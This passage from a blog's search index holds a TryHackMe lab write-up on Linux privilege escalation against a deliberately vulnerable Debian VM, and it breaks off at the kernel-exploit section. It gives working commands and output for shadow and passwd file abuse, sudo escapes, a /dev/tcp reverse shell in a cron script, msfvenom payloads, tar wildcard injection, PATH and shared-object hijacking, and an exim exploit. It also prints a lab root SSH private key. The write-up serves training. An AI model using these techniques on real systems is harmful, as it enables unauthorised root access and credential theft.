nano\n  I use vim\n I use (nano|vim)\n   Match all lines that start with $, followed by any single digit, followed by $, followed by one or more non-whitespace characters\n \\$\\d\\$\\S+\n Match every possible IPv4 IP address (use metacharacters and groups)\n (\\d{1,3}\\.){3}\\d{1,3}\n Match all of these emails while also adding the username and the domain name (not the TLD) in separate groups (use \\w): hello@tryhackme.com, username@domain.com, dummy_email@xyz.com\n (\\w+)@(\\w+)\\.com\n \rThank you for reading this blog post.\n","description":"Learn and practise using regular expressions.","id":3,"section":"posts","tags":["regex"],"title":"Regular Expressions [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/regular-expressions/"},{"content":"   Title  Linux Privilege Escalation     Info  Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root!   Difficulty  Medium   Date 2021/04/17    This VM was created by Sagi Shahar as part of his local privilege escalation workshop but has been updated by Tib3rius as part of his Linux Privilege Escalation for OSCP and Beyond!\nWe are given SSH access to the intentionally misconfigured Debian VM for Linux Privilege Escalation practice.\nWeak File Permissions Readable /etc/shadow The /etc/shadow file contains user password hashes and is usually readable only by the root user.\nNote that the /etc/shadow file on the VM is world-readable.\n1 2  user@debian:~$ ls -la /etc/shadow -rw-r--rw- 1 root shadow 837 Aug 25 2019 /etc/shadow   We will save the root user hash to a file on our local machine and then we will attempt to crack it with john.\n1 2  user@debian:~$ head -n 1 /etc/shadow root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::   Writable /etc/shadow From the previous topic we know that the shadow file is not only world-readable but also world-writable.\nFirst we will generate a new password hash with a password of our choice with the following command.\n1  $ mkpasswd -m sha-512 password   Then we will edit the /etc/shadow file and replace the original root user\u0026rsquo;s password hash with the one we just generated.\nAt last we will switch to the root user, using the new password.\n1 2 3 4  user@debian:~$ su root Password: root@debian:/home/user# id uid=0(root) gid=0(root) groups=0(root)   Writable /etc/passwd The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.\nNote that the /etc/passwd file is world-writable.\n1 2  user@debian:~$ ls -la /etc/passwd -rw-r--rw- 1 root root 1009 Aug 25 2019 /etc/passwd   First we will generate a new password hash with a password of our choice.\n1  openssl passwd password   Then we will copy the root user\u0026rsquo;s row and append it to the bottom of the passwd file, changing the first instance of the word root to newroot and placing the generated password hash between the first and second colon (replacing the \u0026ldquo;x\u0026rdquo;).\nAt last we will switch to the newroot user, using the new password.\n1 2 3  user@debian:~$ su newroot Password: root@debian:/home/user#   Sudo Shell Escape Sequences We will start listing the programs which sudo allows our user to run.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  user@debian:~$ sudo -l Matching Defaults entries for user on this host: env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH User user may run the following commands on this host: (root) NOPASSWD: /usr/sbin/iftop (root) NOPASSWD: /usr/bin/find (root) NOPASSWD: /usr/bin/nano (root) NOPASSWD: /usr/bin/vim (root) NOPASSWD: /usr/bin/man (root) NOPASSWD: /usr/bin/awk (root) NOPASSWD: /usr/bin/less (root) NOPASSWD: /usr/bin/ftp (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/sbin/apache2 (root) NOPASSWD: /bin/more   Then we will visit GTFOBins and search for some of the program names. If the program is listed with sudo as a function, you can use it to elevate privileges, usually via an escape sequence.\nFor example we will choose program Vim. If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n1 2 3 4 5  user@debian:~$ sudo vim -c \u0026#39;:!/bin/sh\u0026#39; sh-4.1# id uid=0(root) gid=0(root) groups=0(root) sh-4.1#   Cron Jobs File Permissions Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  user@debian:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # * * * * * root overwrite.sh * * * * * root /usr/local/bin/compress.sh   There are two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.\nWe need to locate the full path of the overwrite.sh file with the following command.\n1 2  user@debian:~$ locate overwrite.sh /usr/local/bin/overwrite.sh   Then we will check the file permissions.\n1 2  user@debian:~$ ls -l /usr/local/bin/overwrite.sh -rwxr--rw- 1 root staff 40 May 13 2017 /usr/local/bin/overwrite.sh   This shell script is world-writable which means we can replace the contents of the overwrite.sh file with the following bash reverse shell.\n1 2  #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;IP\u0026gt;/4444 0\u0026gt;\u0026amp;1   Then we will set up a netcat listener on our local machine on port 4444 and wait for the cron job to run. A root shell will connect back to our netcat listener as shown below.\n1 2 3 4 5 6 7  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.69.56] 46875 bash: no job control in this shell root@debian:~# id id uid=0(root) gid=0(root) groups=0(root)   PATH Environment Variable Once again we will view the contents of the system-wide crontab and note that the PATH variable starts with /home/user which is our user\u0026rsquo;s home directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  user@debian:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # * * * * * root overwrite.sh * * * * * root /usr/local/bin/compress.sh   We will create a file called overwrite.sh in our home directory with the following contents.\n1 2 3 4  #!/bin/bash  cp /bin/bash /tmp/rootbash chmod +xs /tmp/rootbash   Then we will add executable permission to this shell script.\nWhen the cron job will run it will create a copy of bash with the sticky bit set inside /tmpdirectory. Then we can run the /tmp/rootbash command with flag -p to gain a shell running with root privileges as shown below.\n1 2 3 4 5 6 7 8 9 10 11 12 13  user@debian:~$ chmod +x overwrite.sh user@debian:~$ cd /tmp user@debian:/tmp$ ls -la total 1024 drwxrwxrwt 2 root root 4096 Apr 17 07:58 . drwxr-xr-x 22 root root 4096 Aug 25 2019 .. -rw-r--r-- 1 root root 94708 Apr 17 07:58 backup.tar.gz -rwsr-sr-x 1 root root 926536 Apr 17 07:58 rootbash -rw-r--r-- 1 root root 29 Apr 17 07:52 useless user@debian:/tmp$ ./rootbash -p rootbash-4.1# id uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user) rootbash-4.1#   Wildcards Now we will view the contents of the other cron job script.\n1 2 3 4  user@debian:/tmp$ cat /usr/local/bin/compress.sh #!/bin/sh cd /home/user tar czf /tmp/backup.tar.gz *   We can see that the tar command is being run with a wildcard asterisk (all files) in user\u0026rsquo;s home directory.\nProgram tar has command line options that let us run other commands as part of a checkpoint feature.\nWe will use msfvenom on your local machine to generate a reverse shell ELF binary. Then we will transfer the generated shell.elf file to /home/user/ on the Debian VM.\n1 2 3 4  $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=\u0026lt;IP\u0026gt; LPORT=4444 -f elf -o shell.elf $ scp shell.elf user@10.10.69.56:/home/user user@10.10.69.56\u0026#39;s password: shell.elf 100% 194 2.7KB/s 00:00   On the target machine we will add executable permission to the transferred binary and then we will create two files in /home/user.\n1 2 3  user@debian:~$ chmod +x shell.elf user@debian:~$ touch /home/user/--checkpoint=1 user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf   When the tar command in the cron job runs, the wildcard asterisk will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.\nOn our local machine we will set up a netcat listener on port 4444 and wait for the cron job to run. A root shell will connect back to our netcat listener.\n1 2 3 4 5  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.69.56] 46880 id uid=0(root) gid=0(root) groups=0(root)   SUID / SGID Executables Known Exploits We will start with finding all the SUID/SGID executables on our vulnerable Debian VM with the following command.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  user@debian:~$ find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2\u0026gt; /dev/null -rwxr-sr-x 1 root shadow 19528 Feb 15 2011 /usr/bin/expiry -rwxr-sr-x 1 root ssh 108600 Apr 2 2014 /usr/bin/ssh-agent -rwsr-xr-x 1 root root 37552 Feb 15 2011 /usr/bin/chsh -rwsr-xr-x 2 root root 168136 Jan 5 2016 /usr/bin/sudo -rwxr-sr-x 1 root tty 11000 Jun 17 2010 /usr/bin/bsd-write -rwxr-sr-x 1 root crontab 35040 Dec 18 2010 /usr/bin/crontab -rwsr-xr-x 1 root root 32808 Feb 15 2011 /usr/bin/newgrp -rwsr-xr-x 2 root root 168136 Jan 5 2016 /usr/bin/sudoedit -rwxr-sr-x 1 root shadow 56976 Feb 15 2011 /usr/bin/chage -rwsr-xr-x 1 root root 43280 Feb 15 2011 /usr/bin/passwd -rwsr-xr-x 1 root root 60208 Feb 15 2011 /usr/bin/gpasswd -rwsr-xr-x 1 root root 39856 Feb 15 2011 /usr/bin/chfn -rwxr-sr-x 1 root tty 12000 Jan 25 2011 /usr/bin/wall -rwsr-sr-x 1 root staff 9861 May 14 2017 /usr/local/bin/suid-so -rwsr-sr-x 1 root staff 6883 May 14 2017 /usr/local/bin/suid-env -rwsr-sr-x 1 root staff 6899 May 14 2017 /usr/local/bin/suid-env2 -rwsr-xr-x 1 root root 963691 May 13 2017 /usr/sbin/exim-4.84-3 -rwsr-xr-x 1 root root 6776 Dec 19 2010 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 212128 Apr 2 2014 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 10592 Feb 15 2016 /usr/lib/pt_chown -rwsr-xr-x 1 root root 36640 Oct 14 2010 /bin/ping6 -rwsr-xr-x 1 root root 34248 Oct 14 2010 /bin/ping -rwsr-xr-x 1 root root 78616 Jan 25 2011 /bin/mount -rwsr-xr-x 1 root root 34024 Feb 15 2011 /bin/su -rwsr-xr-x 1 root root 53648 Jan 25 2011 /bin/umount -rwxr-sr-x 1 root shadow 31864 Oct 17 2011 /sbin/unix_chkpwd -rwsr-xr-x 1 root root 94992 Dec 13 2014 /sbin/mount.nfs   From the output above, we will note that /usr/sbin/exim-4.84-3 is vulnerable to manipulating its perl environment and it also has its own CVE: 2016-1531. A local privilege escalation exploit matching this version of exim can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.\nWe will run the exploit script to gain a root shell.\n1 2 3 4  user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh [ CVE-2016-1531 local root exploit sh-4.1# id uid=0(root) gid=1000(user) groups=0(root)   Shared Object Injection Looking for SUID/SGID executables in the previous section, we also note /usr/local/bin/suid-so SUID executable which is vulnerable to shared object injection.\nFirst, we will execute the file and note that currently it displays a progress bar before exiting:\n1 2 3 4  user@debian:~$ /usr/local/bin/suid-so Calculating something, please wait... [=====================================================================\u0026gt;] 99 % Done.   Run strace on the file and search the output for open/access calls and for \u0026ldquo;no such file\u0026rdquo; errors:\n strace is used to analyze how a program interacts with the system. It is one of the most powerful process monitoring, diagnostic, instructional tool of Linux.\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  user@debian:~$ strace /usr/local/bin/suid-so 2\u0026gt;\u0026amp;1 | grep -iE \u0026#34;open|access|no such file\u0026#34; access(\u0026#34;/etc/suid-debug\u0026#34;, F_OK) = -1 ENOENT (No such file or directory) access(\u0026#34;/etc/ld.so.nohwcap\u0026#34;, F_OK) = -1 ENOENT (No such file or directory) access(\u0026#34;/etc/ld.so.preload\u0026#34;, R_OK) = -1 ENOENT (No such file or directory) open(\u0026#34;/etc/ld.so.cache\u0026#34;, O_RDONLY) = 3 access(\u0026#34;/etc/ld.so.nohwcap\u0026#34;, F_OK) = -1 ENOENT (No such file or directory) open(\u0026#34;/lib/libdl.so.2\u0026#34;, O_RDONLY) = 3 access(\u0026#34;/etc/ld.so.nohwcap\u0026#34;, F_OK) = -1 ENOENT (No such file or directory) open(\u0026#34;/usr/lib/libstdc++.so.6\u0026#34;, O_RDONLY) = 3 access(\u0026#34;/etc/ld.so.nohwcap\u0026#34;, F_OK) = -1 ENOENT (No such file or directory) open(\u0026#34;/lib/libm.so.6\u0026#34;, O_RDONLY) = 3 access(\u0026#34;/etc/ld.so.nohwcap\u0026#34;, F_OK) = -1 ENOENT (No such file or directory) open(\u0026#34;/lib/libgcc_s.so.1\u0026#34;, O_RDONLY) = 3 access(\u0026#34;/etc/ld.so.nohwcap\u0026#34;, F_OK) = -1 ENOENT (No such file or directory) open(\u0026#34;/lib/libc.so.6\u0026#34;, O_RDONLY) = 3 open(\u0026#34;/home/user/.config/libcalc.so\u0026#34;, O_RDONLY) = -1 ENOENT (No such file or directory)   On the output above we will note that the executable tries to load the /home/user/.config/libcalc.so shared object within our user home directory, but it cannot be found.\nWe will create the .config directory for the libcalc.so file as shown below.\n1 2 3  user@debian:~$ pwd /home/user user@debian:~$ mkdir .config   Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell.\n1 2 3 4 5 6 7 8 9 10  user@debian:~$ cat /home/user/tools/suid/libcalc.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; static void inject() __attribute__((constructor)); void inject() { setuid(0); system(\u0026#34;/bin/bash -p\u0026#34;); }   We will compile the code into a shared object at the location the suid-so executable was looking for it.\n1 2 3 4 5 6  user@debian:~/.config$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c user@debian:~/.config$ ls -la total 16 drwxr-xr-x 2 user user 4096 Apr 18 06:13 . drwxr-xr-x 6 user user 4096 Apr 18 06:11 .. -rwxr-xr-x 1 user user 6134 Apr 18 06:13 libcalc.so   Then we will execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.\n1 2 3 4  user@debian:~/.config$ /usr/local/bin/suid-so Calculating something, please wait... bash-4.1# id uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)   Environment Variables The /usr/local/bin/suid-env executable listed while finding SUID/SGID executables can be exploited due to it inheriting the user\u0026rsquo;s PATH environment variable and attempting to execute programs without specifying an absolute path.\nFirst, we will execute the file and note that it seems to be trying to start the apache2 webserver.\n1 2 3  user@debian:~$ /usr/local/bin/suid-env [....] Starting web server: apache2httpd (pid 1607) already running . ok   We will run strings on the file to look for strings of printable characters with the following command.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  user@debian:~$ strings /usr/local/bin/suid-env /lib64/ld-linux-x86-64.so.2 5q;Xq __gmon_start__ libc.so.6 setresgid setresuid system __libc_start_main GLIBC_2.2.5 fff. fffff. l$ L t$(L |$0H service apache2 start   The last line (service apache2 start) suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.\nWe will compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell as we can see on the output below.\n1 2 3 4 5 6  user@debian:~$ cat /home/user/tools/suid/service.c int main() { setuid(0); system(\u0026#34;/bin/bash -p\u0026#34;); } user@debian:~$ gcc -o service /home/user/tools/suid/service.c   Then we will prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell.\n1 2 3  user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env root@debian:~# id uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)   Abusing Shell Features #1 The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.\nWe will verify this with the command strings.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  user@debian:~$ strings /usr/local/bin/suid-env2 /lib64/ld-linux-x86-64.so.2 __gmon_start__ libc.so.6 setresgid setresuid system __libc_start_main GLIBC_2.2.5 fff. fffff. l$ L t$(L |$0H /usr/sbin/service apache2 start   In Bash versions \u0026lt; 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.\nFirst we need to verify the version of Bash installed if it is less than 4.2-048.\n1 2 3 4 5 6 7  user@debian:~$ /bin/bash --version GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2009 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.   Then we will create a Bash function with the name /usr/sbin/service that executes a new Bash shell (using flag -p so permissions are preserved) and export the function as shown below. At last, we will run the suid-env2 executable to gain a root shell.\n1 2 3 4 5  user@debian:~$ function /usr/sbin/service { /bin/bash -p; } user@debian:~$ export -f /usr/sbin/service user@debian:~$ /usr/local/bin/suid-env2 root@debian:~# id uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)   Abusing Shell Features #2 When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.\nWe will Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash.\n1  env -i SHELLOPTS=xtrace PS4=\u0026#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)\u0026#39; /usr/local/bin/suid-env2   Then we will run the /tmp/rootbash executable with the flag -p to gain a shell running with root privileges as shown on the output below.\n1 2 3  user@debian:~$ /tmp/rootbash -p rootbash-4.1# id uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)    This will not work on Bash versions 4.4 and above.\n Passwords \u0026amp; Keys History Files If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.\nWe will view the contents of all the hidden history files in the user\u0026rsquo;s home directory with the following command.\n1 2 3 4  user@debian:~$ cat ~/.*history | less . . . mysql -h somehost.local -uroot -ppassword123 . . .   We can see that the user has tried to connect to a MySQL server at some point, using the root username and a password submitted via the command line.\nNow we can switch to the root user, using the password.\n1 2 3 4  user@debian:~$ su root Password: root@debian:/home/user# id uid=0(root) gid=0(root) groups=0(root)   Config Files Config files often contain passwords in plaintext or other reversible formats.\nWe will list the contents of the user\u0026rsquo;s home directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  user@debian:~$ ls -la /home/user total 68 drwxr-xr-x 5 user user 4096 Apr 17 08:18 . drwxr-xr-x 3 root root 4096 May 15 2017 .. -rw------- 1 user user 440 Apr 17 08:00 .bash_history -rw-r--r-- 1 user user 220 May 12 2017 .bash_logout -rw-r--r-- 1 user user 3235 May 14 2017 .bashrc drwxr-xr-x 2 user user 4096 May 13 2017 .irssi drwx------ 2 user user 4096 May 15 2020 .john -rw------- 1 user user 137 May 15 2017 .lesshst -rw-r--r-- 1 user user 212 May 15 2017 myvpn.ovpn -rw------- 1 user user 11 Apr 17 07:56 .nano_history -rw-r--r-- 1 user user 725 May 13 2017 .profile -rw------- 1 root root 12288 Apr 17 07:37 .swp drwxr-xr-x 8 user user 4096 May 15 2020 tools -rw------- 1 user user 6334 May 15 2020 .viminfo   We can see that there is a myvpn.ovpn config file. Viewing its content will contain a reference to another location where the root user\u0026rsquo;s credentials can be found.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  user@debian:~$ cat myvpn.ovpn client dev tun proto udp remote 10.10.10.10 1194 resolv-retry infinite nobind persist-key persist-tun ca ca.crt tls-client remote-cert-tls server auth-user-pass /etc/openvpn/auth.txt comp-lzo verb 1 reneg-sec 0 user@debian:~$ cat /etc/openvpn/auth.txt root password123   Now we can switch to the root user, using the password.\n1 2 3 4  user@debian:~$ su root Password: root@debian:/home/user# id uid=0(root) gid=0(root) groups=0(root)   SSH Keys Sometimes users make backups of important files but fail to secure them with the correct permissions.\nWe will list all the files and directories in the system root and note that there appears to be a hidden directory called .ssh. View the contents of the directory:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  user@debian:/$ ls -la total 96 drwxr-xr-x 22 root root 4096 Aug 25 2019 . drwxr-xr-x 22 root root 4096 Aug 25 2019 .. drwxr-xr-x 2 root root 4096 Aug 25 2019 bin drwxr-xr-x 3 root root 4096 May 12 2017 boot drwxr-xr-x 12 root root 2820 Apr 17 06:55 dev drwxr-xr-x 67 root root 4096 Apr 17 08:09 etc drwxr-xr-x 3 root root 4096 May 15 2017 home lrwxrwxrwx 1 root root 30 May 12 2017 initrd.img -\u0026gt; boot/initrd.img-2.6.32-5-amd64 drwxr-xr-x 12 root root 12288 May 14 2017 lib lrwxrwxrwx 1 root root 4 May 12 2017 lib64 -\u0026gt; /lib drwx------ 2 root root 16384 May 12 2017 lost+found drwxr-xr-x 3 root root 4096 May 12 2017 media drwxr-xr-x 2 root root 4096 Jun 11 2014 mnt drwxr-xr-x 2 root root 4096 May 12 2017 opt dr-xr-xr-x 96 root root 0 Apr 17 06:52 proc drwx------ 5 root root 4096 Apr 17 07:39 root drwxr-xr-x 2 root root 4096 May 13 2017 sbin drwxr-xr-x 2 root root 4096 Jul 21 2010 selinux drwxr-xr-x 2 root root 4096 May 12 2017 srv drwxr-xr-x 2 root root 4096 Aug 25 2019 .ssh drwxr-xr-x 13 root root 0 Apr 17 06:52 sys drwxrwxrwt 2 root root 4096 Apr 17 08:21 tmp drwxr-xr-x 11 root root 4096 May 13 2017 usr drwxr-xr-x 14 root root 4096 May 13 2017 var lrwxrwxrwx 1 root root 27 May 12 2017 vmlinuz -\u0026gt; boot/vmlinuz-2.6.32-5-amd64 user@debian:/$ cd .ssh/ ; ls -la total 12 drwxr-xr-x 2 root root 4096 Aug 25 2019 . drwxr-xr-x 22 root root 4096 Aug 25 2019 .. -rw-r--r-- 1 root root 1679 Aug 25 2019 root_key   Inside this directory there is a world-readable file called root_key. This file is a private SSH key. Also the name of the file suggests it is for the root user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  user@debian:/.ssh$ cat root_key -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2 NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+ 5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7 VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7 6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW 1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K 824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6 Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1 Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa 871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4 CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4 LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw== -----END RSA PRIVATE KEY-----   We will copy the key over to our local machine and give it the correct permissions, otherwise our SSH client will refuse to use it. Then we can use the key to login to the Debian VM as the root account\n1 2 3 4 5 6 7 8 9 10 11 12 13  $ chmod 600 root_key $ ssh -i root_key root@10.10.69.56 Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2 root@debian:~# id uid=0(root) gid=0(root) groups=0(root)   NFS  A Network File System (NFS) allows remote hosts to mount file systems over a network and interact with those file systems as though they are mounted locally. This enables system administrators to consolidate resources onto centralized servers on the network.\n Files created via NFS inherit the remote user\u0026rsquo;s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the \u0026ldquo;nobody\u0026rdquo; user.\nFirst, we will check the NFS share configuration in the exports file located in the /etc directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  user@debian:~$ cat /etc/exports # /etc/exports: the access control list for filesystems which may be exported #\tto NFS clients. See exports(5). # # Example for NFSv2 and NFSv3: # /srv/homes hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check) # # Example for NFSv4: # /srv/nfs4 gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check) # /srv/nfs4/homes gss/krb5i(rw,sync,no_subtree_check) # /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check) #/tmp *(rw,sync,insecure,no_subtree_check)   We will note that the /tmp share has root squashing disabled.\nOn your local machine box, we will switch to root user with the the following command : sudo su\nUsing root user on our machine, we will create a mount point and then mount the /tmp share.\n1 2  mkdir /tmp/nfs mount -o rw,vers=2 10.10.242.104:/tmp /tmp/nfs   Then we will generate a payload using msfvenom as a root user and save it to the mounted share (this payload simply calls /bin/bash).\n1  msfvenom -p linux/x86/exec CMD=\u0026#34;/bin/bash -p\u0026#34; -f elf -o /tmp/nfs/shell.elf   Also we need to make the file executable and set the SUID permission as shown below.\n1  chmod +xs /tmp/nfs/shell.elf   In the vulnerable machine, as the low privileged user account, we will execute the file to gain a root shell.\n1 2 3  user@debian:~$ /tmp/shell.elf bash-4.1# id uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)   Kernel Exploits Kernel exploits can leave the system in an unstable state, which is why we should only run them as a last resort.\nWe will run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 